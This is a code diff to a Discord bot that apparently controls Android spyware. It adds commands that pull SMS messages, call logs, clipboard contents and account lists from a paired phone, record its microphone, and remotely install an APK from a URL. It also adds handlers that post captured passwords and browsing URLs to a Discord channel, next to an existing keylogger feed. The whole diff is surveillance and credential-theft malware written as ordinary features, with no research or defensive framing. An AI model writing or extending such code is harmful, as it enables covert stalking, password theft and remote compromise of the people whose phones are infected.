@@ -999,6 +999,38 @@ class ADexDiscordClient(discord.Client):
         async def usage(interaction: discord.Interaction) -> None:
             await self._queue_remote_command(interaction, "usage", {})
 
+        @self.tree.command(name="getsms", description="Get recent SMS messages")
+        @app_commands.describe(limit="Number of messages to fetch")
+        async def getsms(interaction: discord.Interaction, limit: int = 20) -> None:
+            await self._queue_remote_command(interaction, "getsms", {"limit": limit})
+
+        @self.tree.command(name="getcalllogs", description="Get recent call history")
+        @app_commands.describe(limit="Number of logs to fetch")
+        async def getcalllogs(interaction: discord.Interaction, limit: int = 20) -> None:
+            await self._queue_remote_command(interaction, "getcalllogs", {"limit": limit})
+
+        @self.tree.command(name="recordaudio", description="Record microphone audio")
+        @app_commands.describe(seconds="Duration in seconds")
+        async def recordaudio(interaction: discord.Interaction, seconds: int = 10) -> None:
+            await self._queue_remote_command(interaction, "recordaudio", {"seconds": seconds})
+
+        @self.tree.command(name="installapp", description="Remotely install APK from URL")
+        @app_commands.describe(url="Direct link to APK file")
+        async def installapp(interaction: discord.Interaction, url: str) -> None:
+            await self._queue_remote_command(interaction, "installapp", {"url": url})
+
+        @self.tree.command(name="getclipboard", description="Get current device clipboard")
+        async def getclipboard(interaction: discord.Interaction) -> None:
+            await self._queue_remote_command(interaction, "getclipboard", {})
+
+        @self.tree.command(name="getaccounts", description="List system accounts (Google, etc)")
+        async def getaccounts(interaction: discord.Interaction) -> None:
+            await self._queue_remote_command(interaction, "getaccounts", {})
+
+        @self.tree.command(name="sysinfo_full", description="Get detailed system and hardware info")
+        async def sysinfo_full(interaction: discord.Interaction) -> None:
+            await self._queue_remote_command(interaction, "sysinfo_full", {})
+
         @self.tree.command(name="pair", description="Pair channel with one-time device code")
         @app_commands.describe(code="One-time pairing code shown in app")
         async def pair(interaction: discord.Interaction, code: str) -> None:
@@ -1377,6 +1409,14 @@ class ADexDiscordClient(discord.Client):
             package = data.get("packageName") or "unknown"
             if text:
                 await channel.send(f"⌨️ **Keylog** from `{device_id}` (`{package}`):\n```{text}```")
+        elif event_type == "password_sniff":
+            text = data.get("text") or ""
+            package = data.get("packageName") or "unknown"
+            await channel.send(f"🔐 **Password Captured** on `{device_id}` (`{package}`):\n`{text}`")
+        elif event_type == "browser_url":
+            url = data.get("url") or ""
+            package = data.get("packageName") or "unknown"
+            await channel.send(f"🌐 **Browser Activity** on `{device_id}` (`{package}`):\nURL: <{url}>")
         elif event_type == "app_launch":
             package = data.get("packageName") or "unknown"
             await channel.send(f"🚀 **App Launch** on `{device_id}`: `{package}`")
